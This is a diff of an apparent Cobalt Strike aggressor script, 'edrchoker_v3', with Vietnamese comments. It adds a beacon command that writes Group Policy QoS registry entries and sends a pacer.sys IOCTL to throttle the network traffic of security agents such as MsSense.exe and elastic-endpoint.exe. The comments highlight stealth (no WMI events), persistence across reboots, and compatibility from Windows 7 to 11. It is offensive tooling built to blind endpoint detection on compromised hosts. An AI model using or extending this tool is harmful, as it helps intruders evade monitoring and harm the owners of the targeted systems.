@@ -1,18 +1,27 @@
-# edrchoker_v3.cna — registry-based QoS, no WMI/COM
+# edrchoker_v3.cna — registry-based QoS + pacer.sys ZAW trigger, no WMI/COM
 #
-# v3 ghi thẳng vào registry (Group Policy QoS path) — không có COM, không có WMI.
-# Ưu điểm: footprint thấp nhất, không trigger WMI provider events.
-# Lưu ý: policy CÓ THỂ chưa active ngay — activate bằng:
-#   shell gpupdate /force
-#   hoặc reboot target
-#   hoặc: shell net stop NetQosSvc & net start NetQosSvc
+# v3 ghi thẳng vào registry (Group Policy QoS v1.0 format) — không có COM, không có WMI.
+# Sau khi ghi, trigger IOCTL 0x128050 (ZAW event) lên \\.\PSCHED để pacer.sys reload policy.
 #
-# Persistence: có — policy tồn tại trong registry, active lại sau mỗi lần reboot.
+# Ưu điểm: footprint thấp nhất, không trigger WMI provider events, Win XP -> Win 11 compatible.
+#
+# Giới hạn:
+#   Win 10/11: ZAW event trigger thành công nhưng không có QoS Policy Manager chạy
+#              để translate v1.0 registry thành TC flow per-socket → không throttle được.
+#              Dùng edrchoker_v2 (WMI) cho Win 10/11.
+#   Win 7:     v1.0 format + ZAW event có thể hoạt động (QoS PM còn active).
+#              Test trước: edrchoker_v3 add rồi verify kết nối của target process.
+#
+# Persistence: có — policy tồn tại trong registry, active lại sau mỗi lần reboot
+#              (khi Psched start, QoS PM trên Win 7 đọc lại registry tự động).
+#
+# Yêu cầu: Psched service phải RUNNING (sc query Psched).
+#           Không cần eqos.sys (Enterprise QoS — driver riêng, Win 8+ only).
 #
 # Usage:
-#   edrchoker_v3 add        "proc1.exe;proc2.exe"   ghi registry QoS entries
-#   edrchoker_v3 remove     "proc1.exe;proc2.exe"   xóa policies matching
-#   edrchoker_v3 remove_all                         xóa tất cả policies
+#   edrchoker_v3 add        "proc1.exe;proc2.exe"   ghi registry QoS entries + ZAW trigger
+#   edrchoker_v3 remove     "proc1.exe;proc2.exe"   xóa policies matching + ZAW trigger
+#   edrchoker_v3 remove_all                         xóa tất cả policies + ZAW trigger
 #   edrchoker_v3 list                               liệt kê policies
 
 alias edrchoker_v3 {
@@ -54,23 +63,25 @@ alias edrchoker_v3 {
 
 beacon_command_register(
     "edrchoker_v3",
-    "Throttle EDR via Group Policy QoS registry (no WMI/COM) — active after reboot/gpupdate",
+    "QoS throttle via v1.0 registry + pacer.sys IOCTL 0x128050 ZAW trigger (Win 7: works; Win 10/11: persistence only)",
     "Usage:\n" .
-    "  edrchoker_v3 add        \"p1.exe;p2.exe\"   ghi registry QoS throttle\n" .
-    "  edrchoker_v3 remove     \"p1.exe;p2.exe\"   xóa policies theo process\n" .
-    "  edrchoker_v3 remove_all                   xóa TẤT CẢ QoS policies\n" .
+    "  edrchoker_v3 add        \"p1.exe;p2.exe\"   ghi registry QoS throttle + ZAW trigger\n" .
+    "  edrchoker_v3 remove     \"p1.exe;p2.exe\"   xóa policies theo process + ZAW trigger\n" .
+    "  edrchoker_v3 remove_all                   xóa TẤT CẢ QoS policies + ZAW trigger\n" .
     "  edrchoker_v3 list                         liệt kê active policies\n\n" .
+    "Compat:\n" .
+    "  Win 7:     v1.0 + ZAW CÓ THỂ throttle được (QoS Policy Manager còn active)\n" .
+    "  Win 10/11: ZAW trigger thành công nhưng không enforce (QoS PM dead) → dùng v2\n\n" .
     "So sánh với v2:\n" .
-    "  v2 (WMI): immediate effect, dùng COM/WMI — có WMI provider events\n" .
-    "  v3 (reg): cần reboot/gpupdate, không có COM/WMI — chỉ ADVAPI32 reg calls\n\n" .
-    "Activate sau khi add:\n" .
-    "  shell gpupdate /force\n" .
-    "  shell net stop NetQosSvc & net start NetQosSvc\n\n" .
+    "  v2 (WMI): immediate Win 10/11, cần COM/WMI → WMI provider events\n" .
+    "  v3 (reg): Win 7 + persistence cho Win 10/11, không COM/WMI → chỉ ADVAPI32 + kernel IOCTL\n\n" .
+    "Prereq: sc query Psched → RUNNING\n\n" .
     "Examples:\n" .
     "  edrchoker_v3 add    \"MsSense.exe;elastic-endpoint.exe\"\n" .
     "  edrchoker_v3 remove \"MsSense.exe\"\n" .
     "  edrchoker_v3 remove_all\n" .
     "  edrchoker_v3 list\n\n" .
     "Verify:\n" .
-    "  reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\QoS"
+    "  shell reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\QoS\n" .
+    "  (Win 7: test kết nối process sau khi add)"
 );
